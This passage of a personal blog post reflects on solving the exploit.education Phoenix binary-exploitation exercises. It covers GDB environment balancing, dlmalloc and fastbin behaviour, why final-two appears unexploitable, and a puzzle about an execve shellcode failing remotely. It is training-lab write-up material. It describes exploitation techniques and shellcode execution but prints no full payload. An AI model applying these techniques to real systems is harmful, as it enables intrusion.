+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="mh">0x0000000000000000</span><span class="o">:</span>  <span class="mi">6</span><span class="n">A</span> <span class="n">FF</span>    <span class="k">push</span> <span class="o">-</span><span class="mi">1</span>
+</code></pre>
+</div>
+
+<p>That’s why it works.
+Cool, ham?</p>
+
+<h2 id="get-gdb-and-the-shell-environment-variables-balanced">Get GDB and the SHELL environment variables balanced</h2>
+
+<p>Depending on the attack performing stack layout isn’t relevant, but there are
+times it is important and may or may not mean successful exploitation.</p>
+
+<p>Environment variables changes the stack layout a bit. When we use GDB to help
+understand program behavior and to get some information to the attack, like 
+stack addresses, it may be different from when we will really attack the program
+outside GDB, only from shell.</p>
+
+<p>A tip I’m used to using is set the GDB’s exec-wrapper as <code class="highlighter-rouge">env -i</code> and run the
+program from shell using <code class="highlighter-rouge">env -i</code> too.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ env --help
+...
+-i, --ignore-environment    start with an empty environment
+...
+</code></pre>
+</div>
+
+<p>But there are times the attack is exactly using environment vars. On shell one
+can do <code class="highlighter-rouge">env -i ENV=...</code> to run a program setting only <code class="highlighter-rouge">ENV</code> as environment
+variable, but on GDB I did not managed that to work.</p>
+
+<p>Another approach I used was calling GDB using <code class="highlighter-rouge">env -i</code> and setting the
+environment there, like:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ env -i ENV=... /path/to/gdb -q program
+</code></pre>
+</div>
+
+<p>That’s works fine. Depending on scenario it will differ a little between GDB and
+shell. You can see the environment variables set on GDB and set on SHELL too:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ env -i /usr/bin/gdb -q
+(gdb) show environment
+LINES=83
+COLUMNS=182
+</code></pre>
+</div>
+
+<p>This way you will have a balanced environment.</p>
+
+<h2 id="pay-attention-to-code-all-the-interesting-part">Pay attention to code, all the interesting part</h2>
+
+<p>This one is as simple as hard. Let me explain.</p>
+
+<p>Like I said I did these exercises without studying any material to practice a 
+lot. Those heap exercises was the first time I manage to exploit a userland 
+memory allocator, so I didn’t know how dlmalloc works and so on.</p>
+
+<p>As I want to practice, what more interesting to practice than code auditing? :P
+Off course I knew there is a write primitive on dlmalloc’s free algorithm, but I
+never really saw this happening neither exploited one. This way I download the
+lib and started reading its code.</p>
+
+<blockquote>
+  <p>It is a delightful reading, I advise those interesting to do the same. Very
+organized and documented over code comments.</p>
+</blockquote>
+
+<p>I understood the free algorithm and its collateral effect when freeing a chunk,
+linking chunks each other. Before I start the exploitation I want to see this in
+action. So I take GDB and inspect the memory.</p>
+
+<p>For my surprise I wasn’t able to see the algorithm happens, linking the chunks
+and so on. I back to code and inspect memory sometimes. Then I start to debug
+the code to figure out what was happening.</p>
+
+<p>Sooner or later I ended up understanding that it was fastbins, so it wasn’t
+executing the piece of code that I identified as vulnerable. Understanding this
+was a matter of do a little payload adjust to saw the vulnerable code being 
+executed.</p>
+
+<h2 id="final-two-isnt-exploitable">Final-Two isn’t exploitable</h2>
+
+<p>I liked a lot the heap-three exercise. Final-zero and final-one was nice too,
+but I was really excited to attack final-two once it is a remove heap
+exploitation.</p>
+
+<p>So I start reading its code. I understood what it was doing, then I can craft
+some payloads to use the program and confirm my understanding. After having a
+good understanding I did some proof of concept that I can corrupt the chunks.
+Nice, good progress there.</p>
+
+<p>Take a look at the code:</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="p">[...]</span>
+<span class="kt">void</span> <span class="n">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">in_fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">out_fd</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="p">[...]</span>
+    <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
+  <span class="p">}</span>
+  
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">out_fd</span><span class="p">,</span> <span class="s">"Process OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"Process OK</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="p">[...]</span>
+</code></pre>
+</div>
+
+<p>But there was something still strange for me. I wasn’t able to see the free
+happening. Well, there is <code class="highlighter-rouge">free()</code> calls, of course, but <code class="highlighter-rouge">destroylist</code> isn’t set
+anywhere. O.o</p>
+
+<p>I check through GDB on those <code class="highlighter-rouge">free()</code> calls and I was right, it would be always
+<code class="highlighter-rouge">free(0)</code>, that way there is no room to exploit dlmalloc’s free problem.</p>
+
+<p>I invest some time looking for other clear vulnerabilities but can’t see any
+until now. I asked some friends like <a href="https://0xten.gitbook.io/public">0xTen</a> and <a href="https://dayzerosec.com/about.html">zi</a>
+their opinions on it, they agreed with me that the expected solution, similar to
+protostar, does not exists on Phoenix.</p>
+
+<p>There is <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-final-two-solution/">another blogpost</a> about it more descriptive, so take a look there if it
+interest you enough.</p>
+
+<p>I thought about compile the program myself patching it to be vulnerable, but I
+don’t know exactly how Andrew (exploit.education’s author) build it using MUSL
+and dlmalloc version 2.7.2. Figure it out would need time I don’t want to spend
+on it now.</p>
+
+<p>Also as there is <a href="http://exploit.education/protostar/">protostar</a> (another
+exploit.education virtual machine, phoenix’s precursor) I thought about exploit
+it there. I downloaded it but the networking didn’t works out of the box (both
+on Qemu and VMware). This way, again, figure it out would need time that I don’t
+want to spend on it now.</p>
+
+<h1 id="open-question">Open question</h1>
+
+<p>Besides final-three that I would like to do, there is still another question I
+had but can’t answer it.</p>
+
+<p>When doing final-zero I write my payload to do <code class="highlighter-rouge">execve(/tmp/sh)</code>, <code class="highlighter-rouge">/tmp/sh</code>
+being a shellscript I write that just runs <code class="highlighter-rouge">date</code> and saves its output on
+<code class="highlighter-rouge">/tmp/flag</code>. It was just a proof that I got my shellcode executed.</p>
+
+<p>It worked just fine when exploiting the program locally, but when attacking the
+network version it does not works and I can’t figure it out why for now. When I
+run it over network version the <code class="highlighter-rouge">execve()</code> got <code class="highlighter-rouge">ENOENT</code>:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>user@phoenix-amd64:~$ sudo strace -e t=execve -p `pidof final-zero`
+strace: Process 532 attached
+strace: [ Process PID=532 runs in 32 bit mode. ]
+execve("//tmp/sh", ["//tmp/sh", "-s"], NULL) = -1 ENOENT (No such file or directory)
+--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
++++ killed by SIGTRAP +++
+</code></pre>
+</div>
+
+<p>A note about it is that <code class="highlighter-rouge">/tmp/sh</code> exists and has execution permissions set. I
+can call <code class="highlighter-rouge">/tmp/sh</code> from bash and it works fine, as well exploiting the program
+locally (not the networking version):</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>user@phoenix-amd64:~$ cat /tmp/sh
+#!/bin/bash
+
+date &gt; /tmp/flag
+user@phoenix-amd64:~$ ls -l /tmp/sh
+-rwxr-xr-x 1 user user 30 May 20 17:28 /tmp/sh
+</code></pre>
+</div>
+
+<p>Strangely enough changing from execute <code class="highlighter-rouge">/tmp/sh</code> to <code class="highlighter-rouge">/bin/sh</code> it works and I
+receive my shell.</p>
+
+<p>If you have any clue about it, please, send it to me :)</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>What a ride, uhm?! :P</p>
+
+<p>I liked a lot doing these exercises. I learn a lot from it. I think I liked even
+more the way I did it: from scratch. I mean, writing the shellcodes used,
+reading entire codes (like the dlmalloc one) and try to really understanding
+what is happening.</p>
+
+<p>Remember this quote from before?</p>
+
+<blockquote>
+  <p>As I didn’t practice those topics as I want I didn’t feel like I really 
+<strong>understood</strong> them.</p>
+</blockquote>
+
+<p>Well, this had changed :)
+Of course it is yet basic userland binary exploitation concepts, but it had
+improved a lot my analysis and understanding.</p>
+
+<h1 id="thanks">Thanks</h1>
+
+<p>I thank my friends a lot for listen me on this, help (even indirectly, like just
+listening as <a href="https://en.wikipedia.org/wiki/Rubber_duck_debugging">rubber duck
+debugging</a>).</p>
+
+<p>I also bothered some friends to proofread this post, I also thank you immensely.
+:)</p>
+
+<p>Also thanks to you reading until here. If you want to do any comments, I’ll
+appreciate it a lot. Contact me wherever your prefer (email, twitter, mastodon 
+…).</p>
+
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+              </main>
+            </div>
+          </div>
+	</main>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      Thx!
+    </footer>
+  </div>
+</div>
+
+
+      </div>
+    </body>
+</html>
